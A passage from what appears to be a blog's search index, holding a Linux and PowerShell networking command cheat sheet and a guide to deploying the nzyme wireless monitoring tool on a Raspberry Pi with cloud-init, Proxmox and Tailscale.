VLAN style interfaces.</p> <p>Alternatively you could use these commands to completely recreate the information for your existing <code>eth0</code> interface from scratch if necessary.</p> <p>Enable / disable an interface:</p> <pre><code>sudo ip link set wlan0 down\n# Set the interface to monitor mode, or change the mac address\nsudo ip link set wlan0 up\n</code></pre> <p>Add / remove an IP address on a device:</p> <pre><code>sudo ip addr add &lt;subnet/cidr&gt; dev &lt;dev&gt;\nsudo ip addr del &lt;subnet/cidr&gt; dev &lt;dev&gt;\n</code></pre> <p>Why would you do this?</p> <p>In some cases, particularly with local VM's on laptops cycling through sleep and wake modes, stale network information can persist on the interface. Rather than rebooting, if you're not familiar with the network configuration the system is using, you can manually remove old information this way.</p> <p>Purge all IP information from a device: <pre><code>sudo ip address flush dev eth4\n</code></pre></p> <p>To configure an interface from scratch:</p> <p>You can get disconnected over SSH by doing this.</p> <pre><code>sudo ip addr flush dev eth0\nsudo ip addr add 10.55.55.99/24 dev eth0\nsudo ip route add default via 10.55.55.1\nsudo nano /etc/resolv.conf  # Add DNS information\n</code></pre>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#iw","title":"iw","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#netplan","title":"netplan","text":"<p>netplan</p> <p>YAML network configuration abstraction for various backends.</p> <ul> <li>netplan.io (Maintained by Canonical)</li> <li>readthedocs.io YAML Configuration Reference</li> <li>Ubuntu Server Guide: Networking</li> </ul> <p>Network Renderer</p> <p>During early boot, the netplan \"network renderer\" runs which reads <code>/{lib,etc,run}/netplan/*.yaml</code> and writes configuration to <code>/run</code> to hand off control of devices to the specified networking daemon. Configured devices get handled by systemd-networkd by default, unless explicitly marked as managed by a specific renderer (NetworkManager).</p> <p>Valid values are <code>networkd</code> and <code>NetworkManager</code>.  Defaults to <code>networkd</code> if not defined. This is the most minimal netplan configuration for most desktop environments:</p> <pre><code># /etc/netplan/01-network-manager-all.yaml\nnetwork:\n  version: 2\n  renderer: NetworkManager\n</code></pre> <p>Much of this is quoted from the manpages.</p> <p>Practical Usage </p> <p>Display the current configuration of an <code>[&lt;interface&gt;]</code> or <code>-a</code> all interfaces:</p> <pre><code>sudo netplan status [&lt;interface&gt;]\nsudo netplan status -a\n</code></pre> <p>netplan status and networkd</p> <p>Currently, netplan status depends on systemd-networkd as a source of data and will try to start it if it's not masked.</p> <p>Create and apply a configuration:</p> <pre><code># Examples from https://netplan.io/\nsudo netplan generate  # Use /etc/netplan to generate the required configuration for the renderers\nsudo netplan try       # Will roll back if networking is broken or without confirmation\nsudo netplan apply     # Applies all configuration for the renderers, restarting them as necessary\n</code></pre>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#etcnetworkinterfaces","title":"/etc/network/interfaces","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#systemd-networkd","title":"systemd-networkd","text":"<p>systemd-networkd</p> <p>systemd-networkd is a system service that manages networks. It detects and configures network devices as they appear, as well as creating virtual network devices.</p> <ul> <li><code>systemd-networkd.service</code></li> <li><code>/lib/systemd/systemd-networkd</code></li> </ul> <p>To configure low-level link settings independently of networks, see systemd.link(5).</p> <p>Summary taken from the systemd-networkd manpage.</p> <p>Practical Usage </p> <p>Get DNS settings:</p> <pre><code>resolvectl status\n</code></pre> <p>resolvectl</p> <p><code>resolvectl</code> may be used to resolve domain names, IPv4 and IPv6 addresses, DNS resource records and services with the systemd-resolved.service(8) resolver service.</p> <p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#networkmanager-nmcli","title":"NetworkManager (nmcli)","text":"<p>NetworkManager Command Line Utility</p> <p>NetworkManager Command Line, or <code>nmcli</code>. Much of this information was gleaned and adapted from RedHat's documentation linked below.</p> <p>This is the standard utility for managing and interacting with NetworkManager for networking in desktop environments, where servers primarily use netplan with systemd-networkd as the backend renderer.</p> <ul> <li>gnome.org NetworkManager Project Page</li> <li>RedHat: Configuring IP Networking with <code>nmcli</code></li> <li>RedHat Legal Notice</li> <li>CC BY-SA 3.0</li> </ul> <p>Practical Usage </p> <p>To enable and disable connections based on network interface (device):</p> <pre><code>nmcli device\nnmcli dev down enp1s0\nnmcli dev up eth0\n</code></pre> <p>To enable and disable connections based on profile:</p> <pre><code>nmcli con show\nnmcli con down 'Wired connection 1'\nnmcli con up 'hyper-v-lab'\n</code></pre> <p>The Default Profile</p> <p>The default <code>Wired connection 1</code> is the most generic and versitile profile that accepts DHCP when it's available.</p> <p>To configure an interface profile from scratch for an ethernet connection with static values using <code>nmcli</code> (adapted from the nmcli-examples manpage):</p> <pre><code>CON_NAME='hyper-v-lab'\nIFNAME='eth0'\nADDR_IPV4='10.55.55.11/24'\nGTWY_IPV4='10.55.55.1'\nDNS_IPV4='1.1.1.1 1.0.0.1'\nADDR_IPV6=''\nGTWY_IPV6=''\nDNS_IPV6='2606:4700:4700::1111 2606:4700:4700::1001'\nnmcli con add type ethernet con-name \"$CON_NAME\" ifname \"$IFNAME\" ip4 \"$ADDR_IPV4\" gw4 \"$GTWY_IPV4\"\nnmcli con mod \"$CON_NAME\" ipv4.dns \"$DNS_IPV4\"\nnmcli con mod \"$CON_NAME\" ipv6.dns \"$DNS_IPV6\"\nnmcli con up \"$CON_NAME\" ifname \"$IFNAME\"\nnmcli device status\nnmcli -p con show \"$CON_NAME\"  # -p \"pretty\" output is more readable\n</code></pre> <p>Managed and Unmanaged Networking</p> <p>If you get the error that \"device is strictly unmanaged\" check <code>/etc/NetworkManager/</code> and <code>/etc/NetworkManager/conf.d</code>.</p> <p>Look for any configurations lines under <code>[keyfile]</code> or <code>[ifupdown]</code> sections in files that might be setting interfaces as unmanaged or strictly managed.</p> <p>In Kali, you need to change <code>managed=false</code> to <code>managed=true</code> in <code>/etc/NetworkManager/NetworkManager.conf</code> to use <code>nmcli</code>.</p> <p>To delete a network configuration:</p> <pre><code>nmcli con show\n\n# Delete based on profile-name\nnmcli con delete id &lt;profile-name&gt;\n\n# Delete based on uuid\nnmcli con delete uuid &lt;profile-uuid&gt;\n</code></pre> <p>Scan for wireless networks:</p> <pre><code>nmcli device wifi list [--rescan yes] [ifname wlan0] [bssid &lt;bssid&gt;]\n</code></pre> <p>Connect to or disconnect from a wireless network:</p> <pre><code># Prompt for the password\nnmcli --ask device wifi connect &lt;ssid&gt; ifname &lt;wlanX&gt;\n\n# Password will appear in bash history\nnmcli device wifi connect &lt;ssid&gt; password &lt;password&gt; ifname &lt;wlanX&gt;\n\nnmcli device disconnect &lt;wlanX&gt;\n</code></pre> <p>Expanded Usage </p> <p>Create a wireless networking profile from scratch that does the following:</p> <ul> <li>Ignore local DHCP server's suggested DNS servers and set your own.</li> <li>Does not use mDNS or LLMNR</li> <li>Randomizes your MAC address</li> <li>See also:<ul> <li>NetworkManager Docs: nmcli Settings</li> <li>serverfault.com How to Manage DNS via nmcli</li> </ul> </li> </ul> <p>AI Usage</p> <p>Some of these settings were originally suggested as part of a larger script built with help from ChatGPT (GPT-o1-preview) from OpenAI.</p> <p>The nmcli settings can be verified in the documentation linked above.</p> <pre><code>CONN_NAME='Some-ESSID'\nSSID=\"$CONN_NAME\"\nINTERFACE='wlan0'\nnmcli connection add type wifi ifname \"$INTERFACE\" con-name \"$CONN_NAME\" ssid \"$SSID\"\n\nnmcli connection modify \"$CONN_NAME\" ipv4.dns \"127.0.0.1\"\nnmcli connection modify \"$CONN_NAME\" ipv4.ignore-auto-dns yes\n\nnmcli connection modify \"$CONN_NAME\" ipv6.dns \"::1\"\nnmcli connection modify \"$CONN_NAME\" ipv6.ignore-auto-dns yes\n\n# Disable LLMNR and mDNS\nnmcli connection modify \"$CONN_NAME\" connection.llmnr \"no\"\nnmcli connection modify \"$CONN_NAME\" connection.mdns \"no\"\n\n# Set MAC address to a random value\nnmcli connection modify \"$CONN_NAME\" 802-11-wireless.cloned-mac-address \"random\"\n\n# You will be prompted for the password\nnmcli connection up \"$CONN_NAME\"\n</code></pre> <p>This is not a global setting</p> <p>You will need to set this per-connection name meaning you likely need to run this for every wireless network you connect to, as they all use unique connection profile names.</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#iptables","title":"iptables","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#nftables","title":"nftables","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#ufw","title":"ufw","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#firewall-cmd","title":"firewall-cmd","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#powershell","title":"PowerShell","text":"<p>Networking commands available to PowerShell, including both Windows and Linux versions.</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#test-netconnection","title":"Test-NetConnection","text":"<p>Tests a TCP or UDP connection to a remote host:port. <code>ComputerName</code> can be an IP or hostname.</p> <pre><code>Test-NetConnection -ComputerName 1.1.1.1 -Port 853\n\n# Linux\nTest-Connection -ComputerName example.com -Port 443\n</code></pre> <p>On Linux, PowerShell may only have <code>Test-Connection</code>, which functions the same way but only returns <code>True</code> or <code>False</code>:</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#get-nettcpudpconnection","title":"Get-Net[TCP|UDP]Connection","text":"<p>These blocks emulate the behavior of what you might see when using <code>netstat</code> or <code>ss</code> on Linux, but on Windows using PowerShell. These examples were first covered in the SANS Diary \"Netstat, but Better and in PowerShell\". All SANS blog content falls under the CC BY-NC-SA 4.0:</p> <p>TCP connections, show connection time in seconds, sort by state: <pre><code>Get-NetTCPConnection | select LocalAddress,LocalPort,RemoteAddress,RemotePort,State,@{Name=\"LifetimeSec\";Expression={((Get-Date)-$_.CreationTime).seconds}},OwningProcess,@{Name=\"Process\";Expression={ (Get-Process -Id $_.OwningProcess).ProcessName } }| Sort State | ft -auto\n</code></pre></p> <p>UDP connections, show connection time in seconds, sort by port: <pre><code>Get-NetUDPEndpoint | select LocalAddress,LocalPort,@{Name=\"LifetimeSec\";Expression={((Get-Date)-$_.CreationTime).seconds}},OwningProcess,@{Name=\"Process\";Expression={ (Get-Process -Id $_.OwningProcess).ProcessName } }| Sort LocalPort | ft -auto\n</code></pre></p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#netcat","title":"netcat","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#socat","title":"socat","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#nmap","title":"nmap","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#zmap","title":"zmap","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#naabu","title":"naabu","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#masscan","title":"masscan","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#chisel","title":"chisel","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#proxychains","title":"proxychains","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/","title":"nzyme x [ Raspberry Pi +  Proxmox +  Tailscale]","text":"<p>This guide walks through deploying nzyme on a Raspberry Pi (4B or 5) leveraging autoconfiguration tools available on each system. For Raspberry Pi OS this includes writing additional files into the bootfs and rootfs partitions. For Ubuntu server images cloud-init or Ansible could be used.</p> <p>The result is nzyme running as either a stand-alone system, or as a distributed node + tap where the nzyme-node lives on a server like Proxmox with the nzyme-tap sending data back to it from the external Raspberry Pi. Tailscale is also brought into focus for secure remote access.</p> <p>This guide doesn't offer anything new in terms of nzyme usage that the official documentation doesn't already answer, but more of what you might run into and steps on how to achieve certain deployments if your goal is anything like what's described below.</p> <p>Prerequisites</p> <p>This a short list of items you may want to use, or mix and match, to follow along. Required items are in green, while optional items are in blue.</p> <p>Software:</p> <ul> <li>\ud83d\udfe2 SSH keys</li> <li>\ud83d\udfe2 Tailscale account</li> <li>\ud83d\udd35 Hypervisor (Proxmox, VMware, Hyper-V, QEMU)</li> </ul> <p>Hardware:</p> <ul> <li>\ud83d\udfe2 Raspberry Pi 4B or 5 (one or more)</li> <li>\ud83d\udfe2 External wireless card (Alfa adapters)</li> <li>\ud83d\udfe2 USB 32GB or more, or an external SSD for the Raspberry Pi</li> </ul>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/#references","title":"References","text":"<p>External links to referenced software and services you may need as you follow along.</p> <ul> <li>github.com/nzymedefense</li> <li>nzyme Documentation</li> <li>nzyme Wireless Adapter Compatability</li> <li>GitHub Discussion Forum</li> <li>Raspberry Pi Documentation</li> <li>cloud-init Documentation</li> <li>Tailscale</li> <li>Tailscale installer.sh</li> <li>Proxmox-VE</li> <li>WiFi Challenge Lab</li> </ul>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/#tailscale-acls","title":"Tailscale ACLs","text":"<p>If you're planning to use Tailscale to securely access the nzyme dashboard from anywhere (as well as allow the tap(s) to securely communicate to the node(s), you'll need to define the following ACL's in your Tailnet. These allow you as the nzyme-admin to access all nzyme endpoints over SSH, as well as the WebUI on all nzyme-nodes. It also allows nzyme-tap endpoints to connect back to nzyme-nodes to send data.</p> <pre><code>graph LR\n    A{\ud83d\udcbb nzyme-admin};\n    B(\ud83d\udedc nzyme-tap);\n    C(\ud83d\udce6 nzyme-node:22,22900);\n    A --&gt;| SSH | B;\n    A --&gt;| SSH, HTTPS | C;\n    B --&gt;| Wireless Data via HTTPS | C;\n</code></pre> <pre><code>    // Define the tags which can be applied to devices and by which users.\n    \"tagOwners\": {\n        // SNIP\n        \"tag:nzyme-node\":     [\"autogroup:admin\"],\n        \"tag:nzyme-tap\":      [\"autogroup:admin\"],\n        \"tag:nzyme-admin\":    [\"autogroup:admin\"],\n    },\n\n    // SNIP\n        // Allow nzyme endpoint WebUI and SSH access\n        {\n            \"action\": \"accept\",\n            \"src\":    [\"tag:nzyme-admin\"],\n            \"dst\":    [\"tag:nzyme-node:22,22900\", \"tag:nzyme-tap:22\"],\n        },\n        // Allow nzyme-taps to send data to nzyme-nodes\n        {\n            \"action\": \"accept\",\n            \"src\":    [\"tag:nzyme-tap\"],\n            \"dst\":    [\"tag:nzyme-node:22900\"],\n        },\n    //SNIP\n</code></pre>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/#tailscale-authkey","title":"Tailscale Authkey","text":"<p>If you don't know what an authkey is, it allows you to authenticate a device to a Tailnet programmatically, without the browser involved. See the official documentation, or Tailnet Access for steps to generate an authkey.</p> <p>The resulting string looks like <code>tskey-auth-1234567890-ABCDEF1234567890ABCDEF1234567890</code></p>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/#write-an-os-image","title":"Write an OS Image","text":"<p>This is a brief overview of what you may need to write the OS images to an external device for your Raspberry Pi to boot.</p> <ul> <li>Raspberry Pi Imager</li> <li>Rufus</li> <li>Etcher</li> </ul> <p>Ubuntu Server Images</p> <ul> <li>Download the <code>.img.xz</code>, <code>SHA256SUMS</code>, and the <code>SHA256SUMS.gpg</code> files</li> <li>GPG Fingerprint: 8439 38DF 228D 22F7 B374  2BC0 D94A A3F0 EFE2 1092</li> <li>Verify the signature: <code>gpg --verify SHA256SUMS.gpg SHA256SUMS</code> (this validates the checksums)</li> <li>Verify the checksum: <code>sha256sum -c SHA256SUMS --ignore-missing</code> (these validate the image)</li> </ul> <p>Raspberry Pi Images</p> <ul> <li>You'll want the \"Raspberry Pi OS Lite\" image</li> <li>Use the Archive link to download the <code>.img.xz</code>, <code>.sha256</code>, and <code>.sig</code> files (Example)</li> <li>GPG Fingerprint: 54C3 DD61 0D9D 1B4A F82A  3775 8738 CD6B 956F 460C</li> <li>Verify the signature: <code>gpg --verify 2024-11-19-raspios-bookworm-arm64-lite.img.xz.sig 2024-11-19-raspios-bookworm-arm64-lite.img.xz</code></li> <li>Unlike the Ubuntu images, you use the <code>.sig</code> file to validate the OS image file, not the checksum file</li> <li>Verify the checksum: <code>sha256sum -c 2024-11-19-raspios-bookworm-arm64-lite.img.xz.sha256</code></li> </ul> <p>Obtaining signing keys</p> <p>You can generally obtain GPG keys from https://keyserver.ubuntu.com/</p> <p>If you have the fingerprint you can also try: <code>gpg --keyserver hkps://keyserver.ubuntu.com:443 --recv-keys '&lt;fingerprint&gt;'</code></p> <p>The Raspbery Pi OS key is also indexed here: https://www.raspberrypi.org/raspberrypi_downloads.gpg.key</p> <p>It's recommended to use either a small form-factor USB 3.2 drive (for example the SanDisk ultra fit thumb drives) with 32GB of space or more. This is the most convenient option. You can go further and have the OS installed on an SD card or USB stick, and then add an external SSD. This won't be covered here (yet).</p> <p>This guide will focus primarily on the setup of each component and infrastructure involved. You can achieve this using the Raspberry Pi Imager (for macOS, Windows, or Linux), something like Rufus or Etcher, the <code>usb-creator-gtk</code> package on Ubuntu, or even <code>dd</code>.</p> <p>However you write the  image to the external storage device, you'll want to browse or <code>cd</code> into the one of the following partitions after it's created on that device.</p> <ul> <li><code>system-boot</code> (Ubuntu Server)</li> <li><code>rootfs/home/pi/</code> and <code>bootfs</code> (Raspberry Pi OS)</li> </ul> <p>xz utils</p> <p>Etcher may do this automatically for you, however if you use <code>usb-creator-gtk</code> on Ubuntu, you'll need to extract the raw <code>.img</code> file first. You can decompress <code>.xz</code> files, while preserving the original xz archive, with progress printed to the terminal, using the following command.</p> <pre><code>xz -dkv ./2024-11-19-raspios-bookworm-arm64-lite.img.xz\n</code></pre>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/#raspberry-pi-os","title":"Raspberry Pi OS","text":"<p>After writing the image file to external media, you'll see two partitions:</p> <ul> <li><code>bootfs/</code></li> <li><code>rootfs/</code></li> </ul> <p>Raspbery Pi OS has no Debian style preseed.cfg or cloud-init system built in by default. Although there are projects out there and ways to do this, we'll take the most straight forward and universal approach, giving us the initial access we need to do really anything we'd want for any use case.</p> <p>It's worth noting the <code>rpi-imager</code> utility can configure all of the following. Lets assume you want to stick with a built in tool like <code>dd</code>, or another utility for some reason. No matter how you write the RaspiOS image to disk, these steps will work (as of November 2024 / Bookworm).</p> <p>rpi-imager Command Line Output</p> <p>If you're curious what the rpi-imager utility is doing, when you run the AppImage via bash it will print the customization it's doing to stdout. It may look like the following three lines, where the <code>firstrun.sh</code> script is a very long block of shell commands you can visualize in VSCode or <code>vim</code> doing a find-replace for <code>\\n</code> newlines.</p> <ul> <li>Custom config.txt entries: \"\"</li> <li>Custom cmdline.txt entries: \" cfg80211.ieee80211_regdom=GB\"</li> <li>Custom firstrun.sh: <code>&lt;shell-scripting&gt;</code></li> </ul> <p>If you do choose to write the image with <code>rpi-imager</code>, choose to leave the USB mounted after imaging so you can write the tailscale installer and authkey text file to the home directory.</p> <p>Auto-connect to WiFi?</p> <p>/bootfs/wpa_supplicant.conf no longer works as of Debian Bookworm (see the link)</p> <p>NetworkManager likely has a way to be preconfigured to do this. This post will be updated after a solution is found or not.</p>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/#pre-boot-setup","title":"Pre-boot Setup","text":"<p>There are a few files we can create within the <code>rootfs</code> and <code>bootfs</code> partitions.</p> <p>/bootfs/ssh.txt is an empty file that simply enables SSH on boot by being present.</p> <pre><code>touch bootfs/ssh.txt\n</code></pre> <p>/bootfs/userconf.txt defines the initial user.</p> <pre><code># Generate a password hash\nopenssl passwd -6\n\n# Write this to the userconf.txt file\necho `pi:&lt;password-hash&gt;` | tee `bootfs/userconf.txt`\n</code></pre> <p>$HOME Path</p> <p><code>/rootfs/home/pi</code> is the path of the default \"pi\" user.</p> <p>Here you can drop scripts or files you'd like to have available, they become owned by <code>pi:pi</code></p> <p>Write the Tailscale installer.sh file here.</p> <pre><code>cd ./rootfs/home/pi\ncurl -Lf https://github.com/tailscale/tailscale/blob/main/scripts/installer.sh &gt; tailscale-installer.sh\n</code></pre> <p>Also write a key.txt file containing your Tailscale authkey, so you don't have to type it.</p> <pre><code># Paste your tailscale authkey here for script use later\nnano ./rootfs/home/pi/key.txt\n</code></pre> <p>Create <code>/home/pi/.ssh/authorized_keys</code> with your public key.</p> <pre><code>mkdir -p ./rootfs/home/pi/.ssh\nnano ./rootfs/home/pi/.ssh/authorized_keys\n</code></pre> <p>Now move the USB over to the Raspberry Pi device and power it on.</p>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/#after-first-boot","title":"After First Boot","text":"<p>Manual Setup</p> <p>You will need a keyboard and monitor to interact with the device for the remaining steps. This may change in the future.</p> <p>Keyboard Locale</p> <p>You may run into issues with the keyboard locale, for instance when entering the WiFi password. To resolve this you'll need to ensure your keyboard is mapped to the expected country code, just like your WLAN setting.</p> <pre><code>sudo raspi-config\n# Choose \"5 Localisation Options\"\n# Choose \"L3 Keyboard\"\n# Choose \"Keyboard, Generic\" or simply hit Enter\n# Then eventually under \"Keyboard layout\" change to your locale using \"Other\" if it's not listed\n# TAB to OK, then OK, and allow all the defaults from here on\n</code></pre> <p>The file generated at <code>/etc/NetworkManage/system-connections/&lt;ESSID&gt;.nmconnection</code> will contain your WiFi connection information once you setup networking. If you're planning to network the Pi via an ethernet cable, you can skip this part.</p> <ul> <li>Enable Wireless Networking</li> <li>Connect to a Wireless Network</li> </ul> <pre><code># Enable wireless networking by going to Localisation optons and choosing a WLAN country code\nsudo raspi-config\n\n# Check if your radio is enabled\nnmcli radio wifi\n\n# Enable your radio\nnmcli radio wifi on\n\n# Scan the local area for available wifi networks\nnmcli dev wifi list\n\n# Connect to a wireless network\nsudo nmcli --ask dev wifi connect &lt;example_ssid&gt;\n</code></pre> <p>This is what the <code>&lt;ESSID&gt;.nmconnection</code> file looks like for reference, using WPA2:</p> <pre><code>[connection]\nid=&lt;essid-here&gt;\nuuid=&lt;unique-uuid-here&gt;\ntype=wifi\ninterface-name=wlan0\n\n[wifi]\nmode=infrastructure\nssid=&lt;essid-here&gt;\n\n[wifi-security]\nauth-alg=open\nkey-mgmt=wpa-psk\npsk=&lt;wifi-password-here&gt;\n\n[ipv4]\nmethod=auto\n\n[ipv6]\naddr-gen-mode=default\nmethod=auto\n\n[proxy]\n</code></pre> <p>You can generate a UUID with:</p> <pre><code>uuidgen\n# or\ncat /proc/sys/kernel/random/uuid\n</code></pre> <p>What is wlan0?</p> <p>In this case <code>wlan0</code> will always be the built in wireless card of the Raspberry Pi. Since we're using an external wireless card as the nzyme-tap monitoring interface, we end up using the onboard card to provided us a way to connect to a network, and this provides us access from other devices either locally on that subnet, or remotely via Tailscale.</p> <p>Connecting over WiFi was used as an example 1) because it's trickier to visualize and execute without doing it before instead of simply connecting via an ethernet cable, and 2) to keep in the spirit of all-things-wireless, it wouldn't make sense to leave this out of the guide.</p> <p>Additional Steps</p> <p>The remaining steps are mostly preference, but were part of the initial setup when drafting this guide.</p> <p>On first login, you may have issues with the timesync being off.</p> <pre><code>sudo systemctl restart systemd-timesyncd\n</code></pre> <p>Once that's done, update the system.</p> <pre><code>sudo apt update; sudo DEBIAN_FRONTEND=noninteractive apt full-upgrade -y\nsudo systemctl reboot\n</code></pre> <p>Finally, run the Tailscale installer and authenticate to your Tailnet.</p> <pre><code>cd /home/pi/\nsudo bash ./installer.sh\nsudo tailscale up --authkey $(cat key.txt)\nsudo tailscale set --accept-dns=false\n</code></pre> <p>It's also not a bad idea to configure a firewall.</p> <pre><code>sudo apt install -y ufw\nsudo ufw enable\nsudo ufw allow ssh\n# This can be configured further remotely over Tailscale\n</code></pre>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/#ubuntu","title":"Ubuntu","text":"<p>After writing the Ubuntu image to  your USB or SD card, you'll see two partitions were created; a <code>system-boot</code> and <code>writable</code> partition. Browse into the <code>system-boot</code> directory. Here you'll find two files we can use to automate the setup process; <code>user-data</code>, and <code>network-config</code>.</p>"},{"location":"blog/2024/12/01/material-wifi-alert-nzyme-x-simple-raspberrypi-raspberry-pi--simple-proxmox-proxmox--simple-tailscale-tailscale/#cloud-config","title":"cloud-config","text":"<p>user-data</p> <p>You can either replace the <code>user-data</code> file completely, using  the contents below, or comment out the few existing lines and append the YAML contents (below). Either way, this file will contain all of our required changes. It will:</p> <ul> <li>Initialize our user, with our SSH public key for secure remote access</li> <li>Install Tailscale and authenticate to our Tailnet, by embedding a Tailscale authkey into the user-data file</li> <li>This is kept as generic as possible to be reusable for more than just an nzyme-tap or node</li> </ul> <p>Make the config your own</p> <p>Replace all values encapsulated in <code>{{ Jinja2 syntax }}</code> below with your own.</p> <p>See https://cloudinit.readthedocs.io/en/latest/reference/examples.html for a complete reference of <code>user-data</code> examples.</p> <pre><code># On first boot, set the (default) ubuntu user's password to \"ubuntu\" and\n# expire user passwords\nchpasswd:\n    expire: true\n    users:\n    - name: {{ username }}\n        password: ubuntu\n        type: text\n\n\n# Set system hostname\nhostname: nzyme-tap\n\n\n# Require public key auth\nssh_pwauth: false\n\n\n# User definitions\nusers:\n    - default\n    - name: {{ username }}\n        primary_group: {{ username }}\n        groups:\n            - users\n            - sudo\n        shell: /bin/bash\n        # Allows sudo use, requiring a password\n        sudo:\n            - ALL=(ALL) ALL\n        # Import an SSH public key from GH or LP\n        ssh_import_id:\n            - lp:{{ your-launchpab-username }}\n            - gh:{{ your-github-username }}\n        # Manually add a public SSH key if it's not available on GH or LP\n        ssh_authorized_keys:\n            - {{ your-public-key }}\n        lock_passwd: false\n        # Optional, create with mkpasswd --method=SHA-512 --rounds=4096\n        passwd: {{ create-passwd-with-mkpasswd }}\n\n\n## Update apt database and upgrade packages on first boot\npackage_update: true\npackage_upgrade: true\n\n\n## Install additional packages on first boot, optional\n#packages:\n#- curl\n#- pipx\n\n\n## Write arbitrary files to system\nwrite_files:\n- path: /usr/local/bin/tailscale-installer.sh\n    owner: root:root\n    permissions: '0755'\n    content: |\n        {{ replace with raw, plaintext\n        data of the installer.sh for\n        tailscale }}\n\n\n## Commands to run on first boot\nruncmd:\n    # Note: Don't write files to /tmp from cloud-init use /run/somedir instead.\n    # Early boot environments can race systemd-tmpfiles-clean LP: #1707222.\n\n    # Optional, if you didn't write the installer file as a base64 encoded file\n    # to disk earlier in user-data\n    #- wget \"https://github.com/tailscale/tailscale/raw/refs/heads/main/scripts/installer.sh\" -O /usr/local/bin/tailscale-installer.sh\n    #- sha256sum /usr/local/bin/tailscale-installer.sh | grep -i \"{{ sha256sum-of-tailscale-installer }}\"\n\n\n    # Install Tailscale\n    - /usr/local/bin/tailscale-installer.sh\n\n\n    # Authenticate to Tailnet, replace with a real authkey you generate just for this device\n    - tailscale up --authkey {{ tailscale_authkey }}\n    - tailscale set --accept-dns=false\n</code></pre> <p>network-config</p> <p>Now open <code>network-config</code> and replace (or duplicate and modify) the baked-in example with your real connection information.</p> <p>What is wlan0?</p> <p>In this case <code>wlan0</code> will always be the built in wireless card of the Raspberry Pi. Since we're using an external wireless card as the nzyme-tap monitoring interface, we end up using the onboard card to provided us a way to connect to a network, and this provides us access from other devices either locally on that subnet, or remotely via Tailscale.</p> <p>Connecting over WiFi was used as an example 1) because it's trickier to visualize and execute without doing it before instead of simply connecting via an ethernet cable, and 2) to keep in the spirit of all-things-wireless, it wouldn't make sense to leave this out of the guide.</p> <p>Below is a slightly modified and commented version of that example block for you to use.</p> <pre><code>    wifis:\n        wlan0:\n            dhcp4: true\n            optional: true\n            access-points:\n                # WPA2/3 Example\n                myhomewifi:\n                    password: \"S3kr1t\"\n                # EAP/TLS Example\n                workssid:\n                    auth:\n                        key-management: eap\n                        method: peap\n                        identity: \"me@example.com\"\n                        password: \"passw0rd\"\n                        ca-certificate: /etc/my_ca.pem\n\n            # Change to your local country code\n            regulatory-domain: GB\n</code></pre> <p>Convert tabs to spaces</p> <p>In VSCode it's easy, and going to help you after manually writing the YAML config files for cloud-init, to ensure there are no invisible tabs or spaces that will break your entire config.</p> <p>Simply follow the advice in this post to open the command list and type \"Convert Indentation to Spaces\", finally clicking that command to execute it.</p> <p>Finally, you can validate your config with:</p> <pre><code>cloud-init schema --config-file=/media/user/system-boot/user-data --annotate\n# You want \"Valid schema /media/user/system-boot/user-data\" at the bottom of the output\n</code></pre> <p>Move the USB or SD card over to the Raspberry Pi. It's useful to have a video connection to a monitor available should anything go wrong. Otherwise you'll see your Pi connect to your Tailnet via the Tailscale web console.</p> <p>At this point ensure you 